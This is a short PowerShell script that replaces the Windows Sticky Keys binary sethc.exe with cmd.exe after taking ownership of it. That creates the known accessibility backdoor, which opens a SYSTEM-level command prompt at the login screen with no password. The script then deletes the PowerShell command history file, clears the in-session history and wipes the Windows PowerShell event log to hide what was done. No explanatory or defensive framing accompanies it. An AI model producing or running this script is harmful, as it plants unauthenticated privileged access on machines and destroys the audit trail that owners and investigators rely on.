# Backup and replace sethc.exe with cmd.exe in case it will need to be restored
$orig = "C:\Windows\System32\sethc.exe"
$backup = "C:\Windows\System32\sethc_backup.exe"
$cmd = "C:\Windows\System32\cmd.exe"

# require elevation check
$who = [Security.Principal.WindowsPrincipal]::new([Security.Principal.WindowsIdentity]::GetCurrent())
if (-not $who.IsInRole([Security.Principal.WindowsBuiltinRole]::Administrator)) {
    Write-Error "This script must be run as Administrator."
    exit 1
}

# backup if not exists
if (-not (Test-Path $backup)) {
    Copy-Item -Path $orig -Destination $backup -Force
}

# take ownership & grant access
& takeown /f $orig
& icacls $orig /grant Administrators:F

# copy cmd to sethc
Copy-Item -Path $cmd -Destination $orig -Force

#how to reverse
#Copy-Item -Path "C:\Windows\System32\sethc_backup.exe" -Destination "C:\Windows\System32\sethc.exe" -Force


try {
    # Clear PSReadLine file history
    $histFile = "$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt"
    if (Test-Path $histFile) {
        Remove-Item $histFile -Force -ErrorAction SilentlyContinue
    }

    # Clear in-memory session history
    Clear-History -ErrorAction SilentlyContinue

    # Clear PowerShell event log
    wevtutil cl "Windows PowerShell" 2>$null
} catch {
    # Ignore any errors during cleanup
}